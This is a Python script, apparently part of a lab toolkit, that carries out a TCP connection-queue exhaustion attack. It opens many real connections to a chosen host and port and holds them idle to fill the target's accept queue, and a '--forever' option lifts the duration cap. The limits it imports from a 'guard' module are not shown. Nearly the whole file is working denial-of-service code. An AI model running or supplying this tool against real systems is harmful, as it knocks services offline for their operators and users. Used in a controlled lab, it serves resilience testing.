"""Agotamiento de la cola de conexiones TCP.

Abre conexiones reales y no pide nada: ocupa la tabla de conexiones y la cola de
aceptacion del destino. Con `--forever` se mantiene abierto hasta Ctrl+C.
No falsifica el origen ni usa sockets crudos, asi que la traza es atribuible.
"""

import argparse
import json
import select
import socket
import time

from guard import (
    MAX_CONNECTIONS,
    MAX_DURATION,
    GuardError,
    clamp,
    parse_target,
    resolve,
)


def peer_closed(sock: socket.socket) -> bool:
    """Indica si el otro extremo cerro o reseteo la conexion."""
    readable, _, _ = select.select([sock], [], [], 0)
    if not readable:
        return False
    try:
        # MSG_PEEK no consume: solo mira si llego FIN o RST.
        return sock.recv(1, socket.MSG_PEEK) == b""
    except (ConnectionResetError, OSError):
        return True


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Agotamiento de cola TCP con conexiones reales (laboratorio)"
    )
    parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
    parser.add_argument("--port", type=int, required=True, help="puerto del destino")
    parser.add_argument("--connections", type=int, default=200, help="conexiones a abrir")
    parser.add_argument("--duration", type=float, default=30.0, help="segundos")
    parser.add_argument("--forever", action="store_true", help="no termina hasta Ctrl+C")
    args = parser.parse_args()

    try:
        host, port = parse_target(args.dns, args.port)
        ip = str(resolve(host, port))
    except GuardError as exc:
        print(f"[abortado] {exc}")
        raise SystemExit(2)

    wanted = int(clamp("connections", args.connections, MAX_CONNECTIONS))
    if not args.forever:
        args.duration = clamp("duration", args.duration, MAX_DURATION)

    print("=" * 66)
    print(f"  DESTINO   : {host}:{port}  ->  {ip}")
    print(f"  PATRON    : {wanted} conexiones abiertas sin completar peticion")
    print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
    print("=" * 66, flush=True)

    opened: list[socket.socket] = []
    failures = 0
    for _ in range(wanted):
        try:
            sock = socket.create_connection((ip, port), timeout=2)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            opened.append(sock)
        except OSError:
            failures += 1
            if failures >= 20 and not opened:
                print("  el destino no acepta conexiones")
                break

    print(f"  abiertas {len(opened)} · fallidas al conectar {failures}", flush=True)

    # Distingue las que el destino cerro nada mas aceptarlas.
    time.sleep(0.5)
    closed = [sock for sock in opened if peer_closed(sock)]
    for sock in closed:
        try:
            sock.close()
        except OSError:
            pass
    opened = [sock for sock in opened if sock not in closed]
    if closed:
        print(f"  el destino cerro {len(closed)} conexiones al aceptarlas", flush=True)

    open_count = len(opened)
    deadline = None if args.forever else time.perf_counter() + args.duration
    died_midway = 0
    try:
        while opened and (deadline is None or time.perf_counter() < deadline):
            time.sleep(1)
            still = [sock for sock in opened if not peer_closed(sock)]
            died_midway += len(opened) - len(still)
            opened = still
            print(f"  mantenidas {len(opened)} conexiones", flush=True)
    except KeyboardInterrupt:
        print("\n  detenido por el usuario")
    finally:
        for sock in opened:
            try:
                sock.close()
            except OSError:
                pass
        print(
            f"  resumen: {open_count} abiertas · {len(closed) + died_midway} cerradas por el destino",
            flush=True,
        )
        print(
            "RESULT:"
            + json.dumps(
                {
                    "kind": "conn",
                    "opened": open_count,
                    "closed_by_peer": len(closed) + died_midway,
                    "connect_failures": failures,
                },
                sort_keys=True,
            ),
            flush=True,
        )


if __name__ == "__main__":
    main()
